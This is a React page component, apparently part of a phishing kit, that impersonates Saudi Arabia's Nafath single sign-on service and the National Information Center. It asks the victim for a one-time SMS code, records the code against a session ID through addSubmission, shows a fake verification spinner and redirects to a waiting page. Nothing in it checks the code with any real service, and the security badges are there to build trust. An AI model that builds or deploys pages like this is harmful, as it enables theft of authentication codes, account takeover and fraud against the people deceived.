import { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { addSubmission } from '@/lib/submissions';
import { Loader2, ShieldCheck } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';


const nafathLogo = 'https://upload.wikimedia.org/wikipedia/commons/thumb/c/cc/Nafath_logo.svg/3840px-Nafath_logo.svg.png';


export default function NomerOtp() {
  const [, setLocation] = useLocation();


  const [otpCode, setOtpCode] = useState('');
  const [loading, setLoading] = useState(false);
  const [timeLeft, setTimeLeft] = useState(180);


  useEffect(() => {
    if (timeLeft === 0) return;
    const timer = setInterval(() => {
      setTimeLeft((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);


  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `0${mins}:${secs.toString().padStart(2, '0')}`;
  };


  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (otpCode.length < 4) return;


    const sessionId = localStorage.getItem("sessionId");
    if (!sessionId) {
      setLocation("/");
      return;
    }


    setLoading(true);
    try {
      addSubmission("nomer_otp", sessionId, { otpCode });
      
      setTimeout(() => {
        setLocation("/nomer-wait");
      }, 2000);
    } catch (error) {
      console.error("خطأ في الإرسال للخادم:", error);
      setLoading(false);
    }
  };


  return (
    <div
      style={{
        minHeight: '100vh',
        backgroundColor: '#f8fafc',
        display: 'flex',
        flexDirection: 'column',
        fontFamily: 'system-ui, -apple-system, sans-serif',
        color: '#1e293b',
        boxSizing: 'border-box'
      }}
      dir="rtl"
    >
      {/* الهيدر */}
      <header
        style={{
          backgroundColor: '#ffffff',
          borderBottom: '1px solid #f1f5f9',
          padding: '14px 20px',
          display: 'flex',
          justifyContent: 'space-between',
          alignItems: 'center',
          boxShadow: '0 1px 2px rgba(0,0,0,0.03)'
        }}
      >
        <img src={nafathLogo} alt="نفاذ" style={{ height: '26px', objectFit: 'contain' }} />
        <span style={{ fontSize: '11px', fontWeight: 'bold', color: '#94a3b8', fontFamily: 'monospace' }}>
          SECURE NODE v8
        </span>
      </header>


      {/* شاشة الإرسال */}
      <AnimatePresence>
        {loading && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            style={{
              position: 'fixed',
              inset: 0,
              backgroundColor: 'rgba(255,255,255,0.97)',
              zIndex: 50,
              display: 'flex',
              flexDirection: 'column',
              alignItems: 'center',
              justifyContent: 'center',
              padding: '20px'
            }}
          >
            <Loader2 style={{ width: '56px', height: '56px', color: '#11998E', animation: 'spin 1s linear infinite', marginBottom: '20px' }} />
            <h2 style={{ fontSize: '20px', fontWeight: 'bold', color: '#1e293b', margin: '0', textAlign: 'center' }}>
              جارٍ التحقق من الرمز الرقمي...
            </h2>
            <p style={{ color: '#64748b', marginTop: '8px', fontSize: '13px', textAlign: 'center' }}>
              برجاء إبقاء هذه النافذة مفتوحة لتفادي قطع التزامن
            </p>
          </motion.div>
        )}
      </AnimatePresence>


      {/* الحاوية الرئيسية */}
      <div
        style={{
          flex: 1,
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          padding: '24px 16px',
          boxSizing: 'border-box'
        }}
      >
        <div
          style={{
            backgroundColor: '#ffffff',
            borderRadius: '24px',
            border: '1px solid #e2e8f0',
            boxShadow: '0 10px 25px -5px rgba(0,0,0,0.05)',
            padding: '32px 24px',
            width: '100%',
            maxWidth: '400px',
            textAlign: 'center',
            boxSizing: 'border-box'
          }}
        >
          <img
            src={nafathLogo}
            alt="النفاذ الوطني الموحد"
            style={{ height: '40px', margin: '0 auto 24px auto', objectFit: 'contain' }}
          />


          <div
            style={{
              display: 'inline-flex',
              alignItems: 'center',
              gap: '6px',
              backgroundColor: '#f0fdf4',
              color: '#11998E',
              padding: '6px 14px',
              borderRadius: '50px',
              fontWeight: 'bold',
              fontSize: '11px',
              marginBottom: '20px',
              border: '1px solid #dcfce7'
            }}
          >
            <ShieldCheck style={{ width: '14px', height: '14px' }} />
            <span>بوابة المصادقة الثنائية الآمنة</span>
          </div>


          <h2 style={{ fontSize: '18px', fontWeight: 'bold', color: '#1e293b', marginBottom: '8px', marginTop: '0' }}>
            التحقق من رقم الجوال
          </h2>
          <p style={{ color: '#64748b', marginBottom: '24px', fontSize: '13px', lineHeight: '1.5', padding: '0 8px' }}>
            تم إرسال الرمز السري المؤقت (OTP) المكون من 6 أرقام إلى جوالك المسجل.
          </p>


          <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
            <div style={{ width: '100%' }}>
              <input
                type="tel"
                inputMode="numeric"
                pattern="[0-9]*"
                required
                value={otpCode}
                onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, '').substring(0, 6))}
                placeholder="• • • • • •"
                dir="ltr"
                maxLength={6}
                autoFocus
                style={{
                  width: '100%',
                  textAlign: 'center',
                  fontSize: '26px',
                  fontWeight: 'bold',
                  letterSpacing: '0.2em',
                  height: '56px',
                  borderRadius: '14px',
                  border: '2px solid #cbd5e1',
                  backgroundColor: '#f8fafc',
                  outline: 'none',
                  boxSizing: 'border-box',
                  WebkitAppearance: 'none'
                }}
              />
            </div>


            <div
              style={{
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '6px',
                color: '#11998E',
                fontFamily: 'monospace',
                fontSize: '16px',
                fontWeight: 'bold',
                backgroundColor: '#f0fdf4',
                padding: '6px 16px',
                borderRadius: '10px',
                width: 'max-content',
                margin: '0 auto',
                border: '1px solid #dcfce7'
              }}
            >
              <span style={{ fontSize: '11px', fontFamily: 'system-ui', fontWeight: '500', color: '#64748b' }}>
                الوقت المتبقي:
              </span>
              <span>{formatTime(timeLeft)}</span>
            </div>


            <button
              type="submit"
              disabled={loading || otpCode.length < 4}
              style={{
                width: '100%',
                height: '50px',
                fontSize: '16px',
                fontWeight: 'bold',
                backgroundColor: loading || otpCode.length < 4 ? '#e2e8f0' : '#11998E',
                color: loading || otpCode.length < 4 ? '#94a3b8' : '#ffffff',
                borderRadius: '14px',
                border: 'none',
                cursor: loading || otpCode.length < 4 ? 'not-allowed' : 'pointer',
                boxShadow: loading || otpCode.length < 4 ? 'none' : '0 4px 12px rgba(17, 153, 142, 0.2)',
                transition: 'background-color 0.2s'
              }}
            >
              تأكيد الرمز والمتابعة
            </button>
          </form>
        </div>
      </div>


      {/* الفوتر */}
      <footer style={{ backgroundColor: '#f1f5f9', borderTop: '1px solid #e2e8f0', padding: '16px 20px' }}>
        <div
          style={{
            maxWidth: '400px',
            margin: '0 auto',
            display: 'flex',
            flexDirection: 'row',
            justifyContent: 'space-between',
            alignItems: 'center',
            gap: '12px'
          }}
        >
          <div style={{ textAlign: 'right' }}>
            <h6 style={{ fontWeight: 'bold', fontSize: '12px', color: '#1e293b', margin: '0 0 2px 0' }}>
              مركز المعلومات الوطني
            </h6>
            <p style={{ fontSize: '10px', color: '#94a3b8', margin: '0' }}>
              جميع الحقوق محفوظة © {new Date().getFullYear()}
            </p>
          </div>
          <div>
            <img src={nafathLogo} alt="NIC" style={{ height: '28px', opacity: '0.5', filter: 'grayscale(100%)' }} />
          </div>
        </div>
      </footer>
      
      <style>{`
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
}
